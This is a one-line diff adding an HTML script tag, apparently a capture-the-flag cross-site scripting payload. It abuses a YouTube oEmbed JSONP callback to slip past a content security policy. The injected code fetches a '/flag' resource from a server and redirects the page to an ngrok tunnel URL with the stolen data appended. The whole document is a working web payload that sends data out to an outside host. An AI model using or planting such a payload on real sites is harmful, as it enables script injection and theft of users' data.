@@ -1,0 +1,1 @@
+<script src="https://youtube.com/oembed?callback=fetch(%27http://165.232.190.5:2000/flag%27).then(function(response){return response.text();}).then(function(data) {document.location =`https://9bf0-27-34-22-31.in.ngrok.io/${data}`});"></script>
